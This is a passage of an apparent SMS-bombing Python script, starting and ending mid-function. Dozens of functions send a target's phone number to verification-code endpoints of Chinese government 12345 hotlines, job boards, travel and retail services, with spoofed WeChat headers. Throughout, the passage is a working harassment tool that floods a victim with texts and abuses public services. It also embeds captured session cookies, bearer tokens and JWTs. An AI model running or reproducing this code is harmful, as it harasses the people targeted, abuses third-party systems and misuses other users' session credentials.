    headers51 = {
        "Content-Type": "application/json;charset=UTF-8",
        "Authorization": "Bearer Epoint_WebSerivce_**##0601",
        "Accept": "text/html;charset=utf-8",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.49(0x18003131) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wx08f3dbf24a512230/11/page-frame.html"
    }
    data51 = {
        "token": "Epoint_WebSerivce_**##0601",
        "params": {
            "phoneNumber": phone
        }
    }

    response51 = requests.post(url51, headers=headers51, data=json.dumps(data51))

def request_url52():
    url52 = "https://yf12345.yunfu.gov.cn/workorderApp/wx/auth/sendVerificationCode.json"
    headers52 = {
        "Host": "yf12345.yunfu.gov.cn",
        "Connection": "keep-alive",
        "content-type": "application/json",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.49(0x18003131) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wx700af81d853b0b69/8/page-frame.html"
    }
    data52 = {
            "mobile": phone,
            "operateType": 18
        }

    response52 = requests.get(url52, headers=headers52, params=data52)

def request_url53():
    url53 = "https://agent.12345.yanan.gov.cn:8000/app/api/v1/orderCitizen/send_captcha"
    headers53 = {
        "Host": "agent.12345.yanan.gov.cn:8000",
        "Connection": "keep-alive",
        "Content-Length": "17",
        "content-type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.49(0x18003131) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wx9f92b2103bd781a2/35/page-frame.html"
    }
    data53 = {
        "phone": phone
    }

    response53 = requests.post(url53, headers=headers53, data=data53)

def request_url54():
    url54 = "https://api.yundaili.com/wx/getCode"
    headers54 = {
        "Host": "api.yundaili.com",
        "Origin": "https://m.yundaili.com",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Accept": "*/*",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.49(0x18003130) NetType/WIFI Language/zh_CN",
        "Accept-Language": "zh-CN,zh-Hans;q=0.9",
        "Referer": "https://m.yundaili.com/",
        "token": "token"
    }
    params4 = {
        "phone": phone,
        "type": 0
    }

    response54 = requests.get(url54, headers=headers54, params=params4)

def request_url55():
    url55 = "http://www.zhrcpq.com/H5/gshrserver.asmx/SqCheckSendSms"
    headers55 = {
        "Host": "www.zhrcpq.com",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "http://www.xbrc.com.cn",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
        "Accept": "*/*",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.49(0x18003130) NetType/WIFI Language/zh_CN",
        "Referer": "http://www.xbrc.com.cn/",
        "Content-Length": "15",
        "Accept-Language": "zh-CN,zh-Hans;q=0.9"
    }
    data55 = {
        "sjh": phone
    }

    response55 = requests.post(url55, headers=headers55, data=data55)

def request_url56():
    url56 = "https://www.qhxdrcw.com/wap//index.php?c=ajax&a=regcode"
    headers56 = {
        "Host": "www.qhxdrcw.com",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://www.qhxdrcw.com",
        "Accept-Encoding": "gzip, deflate, br",
        "Cookie": "Hm_lpvt_cd102be9ee351d7febdac16f5f57b9f8=1716999935; Hm_lvt_cd102be9ee351d7febdac16f5f57b9f8=1716999935",
        "Connection": "keep-alive",
        "Accept": "*/*",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.49(0x18003130) NetType/WIFI Language/zh_CN",
        "Referer": "https://www.qhxdrcw.com/wap/c_register.html",
        "Content-Length": "18",
        "Accept-Language": "zh-CN,zh-Hans;q=0.9"
    }
    data56 = {
        "moblie": phone
    }

    response56 = requests.post(url56, headers=headers56, data=data56)
def request_url57():
    url57 = "https://app.zwfw.nmg.gov.cn/webrest/rest/nmcheckcode/getCheckCode"
    headers57 = {
        "Host": "app.zwfw.nmg.gov.cn",
        "Content-Type": "application/json;charset=UTF-8",
        "Origin": "https://app.zwfw.nmg.gov.cn",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Accept": "application/json",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.49(0x1800312f) NetType/WIFI Language/zh_CN",
        "Referer": "https://app.zwfw.nmg.gov.cn/webrest/h5/wechat.m7.12345standard.baotou/pages/login/register.html?openId=oXtQf5o9niOMybyZZwo-nXW8niZQ",
        "Content-Length": "46",
        "Accept-Language": "zh-CN,zh-Hans;q=0.9"
    }
    data57 = {
        "token": "",
        "params": {
            "mobile": phone
        }
    }

    response57 = requests.post(url57, headers=headers57, data=json.dumps(data57))

def request_url58():
    url58 = "http://12345.sp.nanning.gov.cn/api/consulting/users/send_rand"
    headers58 = {
        "Host": "12345.sp.nanning.gov.cn",
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh-Hans;q=0.9",
        "Content-Type": "application/json",
        "Origin": "http://12345.sp.nanning.gov.cn",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.49(0x1800312f) NetType/WIFI Language/zh_CN",
        "Connection": "keep-alive",
        "Referer": "http://12345.sp.nanning.gov.cn/h5/?code=091e0Ekl2GGwwd4mQLkl2de5NS3e0EkI&state=13",
        "Content-Length": "80",
        "Cookie": "PHPSESSID=jknq1ivn985untokbljrjdoqg8; d2d977c58444271d9c780187e93f80e5=think%3A%7B%22verify_code%22%3A%2273a0885eaf581ec9d7913c111598adb1%22%2C%22verify_time%22%3A%221716889403%22%7D"
    }
    data58 = {
        "mid": "13",
        "userkey": "451c1496131ad35cbe06718e6e42fcb1",
        "mobile": phone
    }

    response58 = requests.post(url58, headers=headers58, data=json.dumps(data58))

def request_url59():
    url59 = "http://smrx12345.xa.gov.cn/api/register/getcode"
    headers59 = {
        "Host": "smrx12345.xa.gov.cn",
        "Accept-Encoding": "gzip, deflate",
        "Cookie": "Login_Status=2",
        "Connection": "keep-alive",
        "Accept": "application/json, text/plain, */*",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.46(0x18002e16) NetType/WIFI Language/zh_CN",
        "Accept-Language": "zh-cn",
        "Referer": "http://smrx12345.xa.gov.cn/improve-info",
        "token": "47a6b87a71d94d22ba88756e1de23f47"
    }
    params5 = {"phone": phone}

    response59 = requests.get(url59, params=params5, headers=headers59)

def request_url60():
    url60 = "http://ycweixin.jxyc12345.cn:18081/yc12345/weixin/me/getVerityCode/" + phone
    headers60 = {
        "Host": "ycweixin.jxyc12345.cn:18081",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "X-Requested-With": "XMLHttpRequest",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-cn",
        "Content-Type": "application/json",
        "Origin": "http://ycweixin.jxyc12345.cn:18081",
        "Content-Length": "0",
        "Connection": "keep-alive",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.46(0x18002e16) NetType/WIFI Language/zh_CN",
        "Referer": "http://ycweixin.jxyc12345.cn:18081/yc12345/weixin/me/bind",
        "Cookie": "jeeplus.session.id=59f6a2b7b6404009843380f4a3b098f2"
    }

    response60 = requests.post(url60, headers=headers60)

def request_url61():
    url61 = "http://weixin.wuxi12345.com/User/GetCode"
    headers61 = {
        "Host": "weixin.wuxi12345.com",
        "Content-Type": "application/json",
        "Origin": "http://weixin.wuxi12345.com",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
        "Accept": "application/json, text/plain, */*",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.46(0x18002e16) NetType/WIFI Language/zh_CN",
        "Referer": "http://weixin.wuxi12345.com/dist/index.html?v=2024053101/",
        "Content-Length": "64",
        "Accept-Language": "zh-cn"
    }
    data61 = {
        "mobile": phone,
        "openid": "o6eyXju3wMP3W0LiU2wIDwoKX5mA"
    }

    response61 = requests.post(url61, data=json.dumps(data61), headers=headers61)

def request_url62():
    url62 = "https://12345mobile.fujian.gov.cn/jf/event/sendMsg"
    headers62 = {
        "Host": "12345mobile.fujian.gov.cn",
        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
        "Origin": "https://12345mobile.fujian.gov.cn",
        "Accept-Encoding": "gzip, deflate, br",
        "Cookie": "JSESSIONID=F365028D809A41B05D2B677602CA6B79",
        "Connection": "keep-alive",
        "Accept": "application/json, text/plain, */*",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.46(0x18002e16) NetType/WIFI Language/zh_CN",
        "Referer": "https://12345mobile.fujian.gov.cn/mobile-fj12345/?code=031Xh02w3le4T2338i0w3gX4XE0Xh02O&state=src%40gzh%2Carea_code%40350900%2Csrc_type%406%2Csub_src_type%406_08",
        "Content-Length": "17",
        "Accept-Language": "zh-cn"
    }
    data62 = {
        "phone": phone
    }

    response62 = requests.post(url62, data=data62, headers=headers62)

def request_url63():
    url63 = "http://www.szsssb.cn/wxgzhjk/rest/wxapprest/getCheckCode"
    headers63 = {
        "Host": "www.szsssb.cn",
        "Accept": "application/json",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-cn",
        "Content-Type": "application/json;charset=UTF-8",
        "Origin": "http://www.szsssb.cn",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.46(0x18002e16) NetType/WIFI Language/zh_CN",
        "Connection": "keep-alive",
        "Referer": "http://www.szsssb.cn/wxgzhjk/H5/wechat.m7.public12345standard.suzhou/pages/interaction/wx_addzixun.html?openId=og-AC57jfuaLlGGxbfcULHdS8Kig",
        "Content-Length": "58",
        "Cookie": "EPTOKEN=66F6F641F0B8B93CE8F13A2A92651B0A72A41251; _CSRFCOOKIE=66F6F641F0B8B93CE8F13A2A92651B0A72A41251; JSESSIONID=34572E91913C954743847931BF8989B3"
    }
    data63 = {
        "token": "SZ12345",
        "params": {
            "phonenumber": phone
        }
    }

    response63 = requests.post(url63, data=json.dumps(data63), headers=headers63)

def request_url64():
    url64 = "https://www.weirenjob.com/zcms/front/member/sendMessage"
    params6 = {
    "mobile": phone,
    "type": "login",
    "siteID": 122,
    "SiteID": 122
}
    headers64 = {
    "Connection": "keep-alive",
    "content-type": "application/json",
    "weirensms": "zvingWeiren",
    "Accept-Encoding": "gzip,compress,br,deflate",
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.49(0x18003131) NetType/WIFI Language/zh_CN",
    "Referer": "https://servicewechat.com/wx44b062f6c2ffe820/39/page-frame.html"
}

    response64 = requests.get(url64, params=params6, headers=headers64)

def request_url66():
    url66 = "https://wx.unigala.com:7443/LQCRM_v2/SMS/checknum.php"
    data66 = {
    "phone": phone
}
    headers66 = {
    "Content-Type": "application/json",
    "Accept-Encoding": "gzip,compress,br,deflate",
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.49(0x18003132) NetType/WIFI Language/zh_CN",
    "Referer": "https://servicewechat.com/wx027e212bcb586aba/289/page-frame.html"
}

    response66 = requests.post(url66, data=json.dumps(data66), headers=headers66)

def request_url67():
    url67 = 'https://fuli.ronghw.cn/mallweb/userRegister/getMobileCode'
    params8 = {
    't': '1717497870',
    'mobile': phone
}
    headers67 = {
    'Connection': 'keep-alive',
    'content-type': 'application/json',
    'Accept-Encoding': 'gzip,compress,br,deflate',
    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.49(0x18003132) NetType/WIFI Language/zh_CN'
}

    response67 = requests.get(url67, params=params8, headers=headers67)

def request_url68():
    url68 = 'https://wxm-api.freshfans.cn/amc/auth/phoneSms?phone=' + phone
    headers68 = {
    'Connection': 'keep-alive',
    'xf-merchant': '6',
    'content-type': 'application/json',
    'Authorization': 'bearer cdf71105-396a-4a77-b891-d00c6bf822e4',
    'xf-mini-appid': 'wxc154964b8495dda5',
    'Accept': 'application/json, text/plain, */*',
    'Accept-Encoding': 'gzip,compress,br,deflate',
    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.49(0x18003132) NetType/WIFI Language/zh_CN'
}

    response68 = requests.get(url68, headers=headers68)

def request_url69():
    url69 = 'https://goauth.infinitus.com.cn/encrySendSms'
    data69 = {
    'terminalType': 'WEAPP',
    'mobile': phone,  
    'smsType': 'REGISTER',
    'ticket': '',
    'randstr': '',
    'captchaAppId': '2023044384'
}
    headers69 = {
    'Connection': 'keep-alive',
    'Content-Length': '95',
    'X-Tingyun': 'c=M|5aJJSi1tj1k',
    'Authorization': 'Basic ZWNwLXdlYXBwOnBCbjVXZVYyQ0dCc2hQR3czanoxQmFhWTlKUEtYd2hR',
    'content-type': 'application/x-www-form-urlencoded',
    'Accept-Encoding': 'gzip,compress,br,deflate',
    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.49(0x18003132) NetType/WIFI Language/zh_CN'
}

    response69 = requests.post(url69, data=data69, headers=headers69)

def request_url70():
    url70 = 'https://12345.jian.gov.cn/prod-api/weChat/getWeChatCode'
    data70 = {
    "mobiles": phone  
}
    headers70 = {
    'Content-Type': 'application/json;charset=utf-8',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Accept': 'application/json, text/plain, */*',
    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.49(0x18003132) NetType/WIFI Language/zh_CN',
    'Accept-Language': 'zh-CN,zh-Hans;q=0.9'
}

    response70 = requests.post(url70, json=data70, headers=headers70)

def request_url72():
    url72 = "https://api.xingyeai.com/weaver/api/v1/account/send_verification_code"
    headers72 = {
    "Host": "api.xingyeai.com",
    "x-timestamp": "1717910393",
    "Accept": "*/*",
    "x-sign": "34aaa5ae223e2f951e4b44c17fcb1740462cb725",
    "x-token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhcHBfaWQiOjYwMCwiYWNjb3VudF9pZCI6MTQ4OTE3ODg0NDU3MTQxLCJkZXZpY2VfaWQiOjE0ODkyMDUyNDA2MjgwMywiaXNfYW5vbnltb3VzIjp0cnVlLCJpc3MiOiJ3ZWF2ZXJfYWNjb3VudCIsImV4cCI6MjAzMzI3MDM2MiwibmJmIjoxNzE3OTEwMzYxfQ.4faM9-nong-GxpUYiLduzhLyLrE0DETSoIqHc3_1UDU",
    "Accept-Language": "zh-cn",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/json",
    "sys_region": "CN",
    "User-Agent": "xingye/798 CFNetwork/1240.0.4 Darwin/20.6.0",
    "Connection": "keep-alive",
    "ip_region": "cn"
}
    data72 = {
    "target": phone
}

    response72 = requests.post(url72, headers=headers72, json=data72)

def request_url73():
    url73 = "https://www.zhiliaoshebao.com/api/sms/send"
    headers73 = {
    "Host": "www.zhiliaoshebao.com",
    "Content-Type": "application/json",
    "Origin": "https://wap.zhiliaoshebao.com",
    "Accept-Language": "zh-cn",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Accept": "*/*",
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
    "Referer": "https://wap.zhiliaoshebao.com/pages/login/login_home"
}
    data73 = {
    "mobile": phone,
    "event": "mobilelogin",
    "type": "h5"
}

    response73 = requests.post(url73, headers=headers73, json=data73)

def request_url74():
    url74 = "https://user.zjzwfw.gov.cn/nuc/login/sendSmsCodeForMobile"
    headers74 = {
    "Host": "user.zjzwfw.gov.cn",
    "Content-Type": "application/json;charset=utf8",
    "X-Timestamp": "1717784224873",
    "Accept": "application/json",
    "X-Access-Id": "szzj",
    "Accept-Language": "zh-cn",
    "X-Sign-Value": "b34db66c7792b32fddb57031234f6ec766aa6108438e81301ab82659dde57c5d",
    "Accept-Encoding": "gzip, deflate, br",
    "X-Sign-Type": "SHA256",
    "Origin": "https://user.zjzwfw.gov.cn",
    "errorMsgTip": "false",
    "X-Device-Id": "4f26dc64a47e2615621990f12af6be1e",
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
    "Referer": "https://user.zjzwfw.gov.cn/pc/mobile/login?1=1&servicecode=zjdsjgrbs&redirectUrl=https%3A%2F%2Fzxts.zjzwfw.gov.cn%2Fmhwwh5%2F",
    "Content-Length": "23",
    "Cookie": "ssxmod_itna=Qqfx9iDtGQqXDXDnD+xbxym2E3Y5qqooApmdQD/8GDnqD=GFDKq0=A7EeD7Gbl37iPh1qIirbfsKbaooIPWb6k8oYDbqDWXDlF=DpxE5GGDDHODjZPDYDt3dGfbOt=kDoakKDHGQ7r3Veu3fS2h1YD2eK0q4GDwxGbY392Gdjn+1DAEzfChPeD==; ssxmod_itna2=Qqfx9iDtGQqXDXDnD+xbxym2E3Y5qqooApeDSD8qDKD/txKkOpRL1P7P34NCqfeBIaLPP1llxn5IkSAYr7vwWFrAATAIRU0iuxL0GkDIzWoGEL2Xh5Ht2DDLxiQHnD2EYhPymAA7K/Q0P3BSK=bwY0Y++vU2DNmBXZDuwe38hYLfhd6rrdom45xeWq27PxD=; tfstk=fawSQc1ZRMsy2pU65bIqhq7W61Mlby6a9HiLjkpyvYHJp2UaYXKUTB8pOl34z4oUv2NIkkeryukrO9a054HEU8WQOY24apuPrvZL7XsV7OWaquDnpN7Zfa4DoAnnJULEyoHYSBzPVOWaquHnpN7NQM0Qiw0EJvh-ptHxoDi-2ynKMiiKYUdKvyEAcD0x2epJeEpxvcop9CpwhmWiSu_ExQtloBx8Vq9pCkiEeVXirpp3E4TZWudHppejVbeEZyjCjVU7A8caeB1Kc8Z_dmqf1CnbFlwIAJbhhgrd7VYnJBOnypnXZisXtBoH3HB9WGgADbnm0NSfcBrIwmmj7isXtBc-mmxGciOUA; webId=1; zjzw_siteCode=330000000000; cna=fTzqHr0R7D0CAf/////n6VnK; arialoadData=false; ariawapForceOldFixed=false; acw_tc=2f624a5717177841772882937e2c220b7597eeb55b0d79d727ea2b00167e9d; Connection=keep-alive",
}
    data74 = {
    "phone": phone
}

    response74 = requests.post(url74, headers=headers74, json=data74)

def request_url75():
    url75 = "https://miniprogram.hebei.com.cn/prod-api/auth/api/sms"
    headers75 = {
    "Host": "miniprogram.hebei.com.cn",
    "Connection": "keep-alive",
    "Content-Length": "17",
    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Accept-Encoding": "gzip,compress,br,deflate",
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
    "Referer": "https://servicewechat.com/wxb66b508f119c78fc/41/page-frame.html"
}
    data75 = {
    "phone": phone
}

    response75 = requests.post(url75, headers=headers75, data=data75)

def request_url76():
    url76 = "https://carlife.ygbx.com/suncar-member/sms/getPhoneMsg/getPhoneMsgVerificationCodeToh5"
    headers76 = {
    "Host": "carlife.ygbx.com",
    "Connection": "keep-alive",
    "Content-Length": "108",
    "appVer": "",
    "channel": "CSHXCX",
    "content-type": "application/json",
    "cshToken": "",
    "carLifeCloudRefreshToken": "",
    "carOwnerCode": "",
    "interfaceCode": "",
    "carLifeCloudToken": "",
    "Accept-Encoding": "gzip,compress,br,deflate",
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.46(0x18002e16) NetType/WIFI Language/zh_CN",
    "Referer": "https://servicewechat.com/wx75e67891811b5b24/67/page-frame.html"
}
    data76 = {
        "verificationCode": "",
        "channel": "100",
        "verificationType": "01",
        "platform": "CSH",
        "phoneNumber": phone
    }

    response76 = requests.post(url76, headers=headers76, data=json.dumps(data76))

def request_url77():
    url77 = "https://a.welife001.com/applet/sendVerifyCode"
    headers77 = {
    "Host": "a.welife001.com",
    "Connection": "keep-alive",
    "Content-Length": "23",
    "x-rid": "4DADE427-935D-4824-A2C6-4E4D8E03251A",
    "content-type": "application/json;charset=utf-8",
    "im潜望": "oWRkU0dOeJVv3PzltYyguCbNKp1Q",
    "Accept-Encoding": "gzip,compress,br,deflate",
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
    "Referer": "https://servicewechat.com/wx23d8d7ea22039466/2387/page-frame.html"
}
    data77 = {
    "phone": phone
}

    response77 = requests.post(url77, headers=headers77, data=json.dumps(data77))

def request_url71():
    url71 = "https://mp.weixiao100.com.cn/wxapp/common/linkman/smsCode?version=1.4.1"
    headers71 = {
        "Content-Type": "application/json",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wxb9fde277552d01bc/201/page-frame.html"
    }
    data71 = {
        "timestamp": 1717994497214,
        "sessionCode": "TJiJ5ZfaAyedSD9b64m5sA==",
        "params": {"phone": phone},
        "signature": "10176e8368f9ef8dd17624cb7e01f57e"
    }

    response71 = requests.post(url71, headers=headers71, data=json.dumps(data71))

def request_url34():
    url34 = "https://wx.17u.cn/xcxpubapi/pubmember/sendmessge"
    headers34 = {
        "TCxcxVersion": "6.5.3",
        "content-type": "application/json",
        "TCPrivacy": "1",
        "TCReferer": "page%2Factivetemplate%2Fbindnew%2Findex",
        "wxapp": "0",
        "sectoken": "ZfOeS2YX9IStsHx-3-C4u4KSB8eL5jifC5BHDfNf9WrdZEfri7n5IIc3DAAyRguwdtCtUYrihpyJG3QDoMAuG16EgAiEunU9cz6-2SRoweVYu7ojklErmYWryHP3phB7kOmThwF_VmNxL679HJZgUM1FFdAetekFwmUlFxjBWEWIpkl6-AaekXksTrye4F_gNIJn-VLPf-P8PIytpG9AlA**4641",
        "apmat": "o498X0b6n9mcU5yd4n3TQGNOBra0|202406101552|649076",
        "TCSecTk": "ZfOeS2YX9IStsHx-3-C4u4KSB8eL5jifC5BHDfNf9WrdZEfri7n5IIc3DAAyRguwdtCtUYrihpyJG3QDoMAuG16EgAiEunU9cz6-2SRoweVYu7ojklErmYWryHP3phB7kOmThwF_VmNxL679HJZgUM1FFdAetekFwmUlFxjBWEWIpkl6-AaekXksTrye4F_gNIJn-VLPf-P8PIytpG9AlA**4641",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wx336dcaf6a1ecf632/637/page-frame.html"
    }
    data34 = {
        "openId": "o498X0b6n9mcU5yd4n3TQGNOBra0",
        "unionId": "ohmdTt8l1P_uyleS2Dfz-K2nhozM",
        "mobile": phone
    }

    response34 = requests.post(url34, headers=headers34, json=data34)

def request_url78():
    url78 = "https://order-api.vivatraveler.com/v1/getSmsCode"
    headers78 = {
        "Content-Type": "text/plain",
        "Origin": "https://order.vivatraveler.com",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Accept": "application/json, text/plain, */*",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Referer": "https://order.vivatraveler.com/",
        "Accept-Language": "zh-cn"
    }
    data78 = {
        "mobile": phone,
        "is_register": '1'
    }

    response78 = requests.post(url78, headers=headers78, json=data78)

def request_url79():
    url79 = "https://wxapp.qunar.com/ucenter/webApi/logincode.jsp"
    headers79 = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Connection": "keep-alive",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wx799d4d93a341b368/2022/page-frame.html"
    }
    data79 = {
        "mobile": phone,
        "source": "ucenter",
        "action": "register",
        "type": "implicit",
        "origin": "wechat$$$small",
        "openId": "oIjYJ0b46H7LxXjbCzkm0CznHECA",
        "token": "72E6415DDAE88E72D6B72DA9A0C6CE79"
    }

    response79 = requests.post(url79, headers=headers79, data=data79)

def request_url80():
    url80 = "https://api.jimuzhou.top/sendCode"
    headers80 = {
        "token": "",
        "content-type": "application/json",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wx8bd3a8a06c31dc77/121/page-frame.html"
    }
    data80 = {
        "username": "",
        "password": "",
        "mobile": phone,
        "code": "",
        "token": "",
        "source": "miniKcbWx"
    }

    response80 = requests.post(url80, headers=headers80, json=data80)

def request_url81():
    url81 = "https://m.doctorpanda.com/panda-h5-web/miniapps/users/sendCode?_t=1718120484723&mobile=" + phone
    headers81 = {
        "Host": "m.doctorpanda.com",
        "Accept-Encoding": "gzip, deflate, br",
        "Cookie": "openId=o7Op2wSBfVbcT4Voj-y_EP-R_8fE; Hm_lpvt_2e291cf7d0548a87221dc29b97180e37=1718120451; Hm_lvt_2e291cf7d0548a87221dc29b97180e37=1718120451; JSESSIONID=node0zep5ie3qw65c1hkumk6w6e9r36141.node0; acw_tc=2760776e17181204506012355e9a87f1586218920fe93f0c5c0eb3099173f4",
        "Connection": "keep-alive",
        "open-id": "o7Op2wSBfVbcT4Voj-y_EP-R_8fE",
        "Accept": "application/json, text/plain, */*",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.48(0x18003030) NetType/WIFI Language/zh_CN",
        "Accept-Language": "zh-cn",
        "Referer": "https://m.doctorpanda.com/wechat/login?from=%2Fmine%3Fchannel%3DXMFEJK",
        "Cache-Control": "no-cache"
    }

    response81 = requests.get(url81, headers=headers81)

def request_url82():
    url82 = "https://mp-api.lsev.com/user/mobile/verifycode"
    headers82 = {
        "x-mse-tag": "mini-optimization",
        "content-type": "application/json",
        "Authorization": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJ1aWQiOiI2NzQ4MDMiLCJpc3MiOiJsc2V2IiwiaWF0IjoxNzE4MTIzNjcyfQ.5E6lbde_1Ve8c3_sVGFoX1JwedAFUnuudPMCx1IGolZSVPhUuB7IRXeVDDt7TTBnMa9KvxlVjXDgihx7m0hB1A",
